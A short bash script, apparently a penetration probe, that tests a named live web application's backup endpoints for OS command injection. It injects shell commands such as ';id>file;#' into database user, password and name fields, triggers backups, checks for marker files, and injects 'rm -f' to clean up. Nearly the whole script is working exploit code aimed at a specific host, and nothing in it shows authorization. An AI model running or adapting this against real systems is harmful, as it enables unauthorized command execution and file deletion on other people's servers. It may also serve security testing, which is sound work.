#!/usr/bin/env bash
# Field-context probe for EZEN backup CMDI.
# Safe: dbName is a bogus DB so mysqldump fails fast; credentials are deliberately wrong.
set -u
T="https://ezen.tysons.co.ke"
W="/opt/wildfly/appfiles/uploads/fms/backup"
ID=88797

sc() { # saveconf <dbname> <dbuser> <dbpass>
  curl -sk -m 20 -X POST "$T/backup/saveconf" \
    --data-urlencode "dbBackupConfig.id=$ID" \
    --data-urlencode "dbBackupConfig.dbName=$1" \
    --data-urlencode "dbBackupConfig.dbUser=$2" \
    --data-urlencode "dbBackupConfig.dbPassword=$3" >/dev/null
}
trig() { # trigger <label>
  curl -sk -m 40 -X POST "$T/backup/add" --data-urlencode "backup.id=1" \
    --data-urlencode "backup.message=$1"
}
marker() { curl -sk -m 15 -o /dev/null -w "%{http_code}" "$T/appfiles/uploads/fms/backup/$1"; }

run() { # run <label> <dbuser> <dbpass> <markerfile>
  echo "--- $1 ---"
  sc "nosuchdb_zz" "$2" "$3"
  echo -n "  trigger: "; trig "$1" | head -c 260; echo
  sleep 1
  echo "  marker $4 -> HTTP $(marker "$4")"
}

echo "=== BASELINE (no injection) ==="
run baseline "" "" "none.txt"

echo
echo "=== dbUser contexts (bogus user => fast auth failure) ==="
run u1_unquoted "zzz;id>$W/u1.txt;#" "" "u1.txt"
run u2_squote   "zzz';id>$W/u2.txt;'" "" "u2.txt"
run u3_dquote   'zzz";id>'"$W"'/u3.txt;"' "" "u3.txt"

echo
echo "=== dbPassword contexts (invalid password prefix => fast auth failure) ==="
run p1_unquoted "" "nx9invalid;id>$W/p1.txt;#" "p1.txt"
run p2_squote   "" "nx9invalid';id>$W/p2.txt;'" "p2.txt"
run p3_dquote   "" "nx9invalid\";id>$W/p3.txt;\"" "p3.txt"

echo
echo "=== RESULTS ==="
for f in u1 u2 u3 p1 p2 p3; do
  code=$(marker "$f.txt")
  echo "$f.txt -> $code"
done

echo
echo "=== CLEANUP + RESTORE ==="
sc "x;rm -f $W/u1.txt $W/u2.txt $W/u3.txt $W/p1.txt $W/p2.txt $W/p3.txt;#" "" ""
trig cleanup >/dev/null
echo -n "cleanup trigger: "; trig "cleanup2" | head -c 160; echo
sc "" "" ""
echo -n "restored config: "; curl -sk -m 20 -X POST "$T/backup/loadconf"; echo
for f in u1 u2 u3 p1 p2 p3; do echo "$f.txt after cleanup -> $(marker "$f.txt")"; done
